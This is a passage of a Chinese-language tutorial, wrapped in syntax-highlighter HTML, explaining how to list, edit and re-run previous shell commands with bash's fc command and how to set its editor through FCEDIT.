data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ fc -l p 528\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f9d153132523-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f9d153132523-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f9d153132523-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">528</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f9d153132523-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者都使用行号：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7fa0549330937\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ fc -l 521 528\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fa0549330937-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fa0549330937-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fa0549330937-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">521</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">528</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fa0549330937-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这三个命令都显示一样的结果。</p>\n<h4 id=\"toc_3\">编辑并执行上一个命令</h4>\n<p>我们经常敲错命令，这时你可以用默认编辑器修正拼写错误并执行而不用将命令重新再敲一遍。</p>\n<p>编辑并执行上一个命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7fa3559226634\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ fc\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fa3559226634-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fa3559226634-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fa3559226634-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">fc</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fa3559226634-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>这会在默认编辑器里载入上一个命令。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/ee5eae4873e4a4d9086aff61084b77b0.png\" alt=\"\"></p>\n<p>你可以看到，我上一个命令是 <code>fc -l</code>。你可以随意修改，它会在你保存退出编辑器时自动执行。这在命令或参数又长又复杂时很有用。需要注意的是，它同时也可能是<strong>毁灭性</strong>的。比如，如果你的上一个命令是危险的 <code>rm -fr &lt;some-path&gt;</code>，当它自动执行时你可能丢掉你的重要数据。所以，小心谨慎对待每一个命令。</p>\n<h4 id=\"toc_4\">更改默认编辑器</h4>\n<p>另一个有用的选项是 <code>-e</code> ，它可以用来为 <code>fc</code> 命令选择不同的编辑器。比如，如果我们想用 <code>nano</code> 来编辑上一个命令:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7fa7572076479\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ fc -e nano\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fa7572076479-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fa7572076479-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fa7572076479-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">nano</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fa7572076479-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这个命令会打开 <code>nano</code> 编辑器（而不是默认编辑器）编辑上一个命令。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/36c07793330d0f7269668ced5d0b30c8.png\" alt=\"\"></p>\n<p>如果你觉得用 <code>-e</code> 选项太麻烦，你可以修改你的默认编辑器，只需要将环境变量 <code>FCEDIT</code> 设为你想要让 <code>fc</code> 使用的编辑器名称即可。</p>\n<p>比如，要把 <code>nano</code> 设为默认编辑器，编辑你的 <code>~/.profile</code> 或其他初始化文件： （LCTT 译注：如果 <code>~/.profile</code> 不存在可自己创建；如果使用的是 bash ，可以编辑 <code>~/.bash_profile</code> ）</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7faa751627147\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ vi ~/.profile\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7faa751627147-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7faa751627147-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7faa751627147-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">profile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7faa751627147-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>添加下面一行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7faf433045103\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nFCEDIT=nano\r\n# LCTT译注：如果在子 shell 中会用到 fc ，最好在这里 export FCEDIT\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7faf433045103-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7faf433045103-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7faf433045103-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7faf433045103-1\"><span class=\"crayon-v\">FCEDIT</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">nano</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7faf433045103-2\"><span class=\"crayon-p\"># LCTT译注：如果在子 shell 中会用到 fc ，最好在这里 export FCEDIT</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7faf433045103-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>你也可以使用编辑器的完整路径：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7fb3431323310\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nFCEDIT=/usr/local/bin/emacs\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fb3431323310-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fb3431323310-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fb3431323310-1\"><span class=\"crayon-v\">FCEDIT</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">emacs</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fb3431323310-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>输入 <code>:wq</code> 保存退出。要使改动立即生效，运行以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7fb6287263642\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ source ~/.profile\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fb6287263642-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fb6287263642-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fb6287263642-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">profile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fb6287263642-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>现在再输入 <code>fc</code> 就可以使用 <code>nano</code> 编辑器来编辑上一个命令了。</p>\n<h4 id=\"toc_5\">不编辑而直接执行上一个命令</h4>\n<p>我们现在知道 <code>fc</code> 命令不带任何参数的话会将上一个命令载入编辑器。但有时你可能不想编辑，仅仅是想再次执行上一个命令。这很简单，在末尾加上连字符（<code>-</code>）就可以了：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7fb9645498242\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ echo \"Welcome to OSTechNix\"\r\nWelcome to OSTechNix\r\n\r\n$ fc -e -\r\necho \"Welcome to OSTechNix\"\r\nWelcome to OSTechNix\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fb9645498242-1\">1</div><div class=\"crayon-num 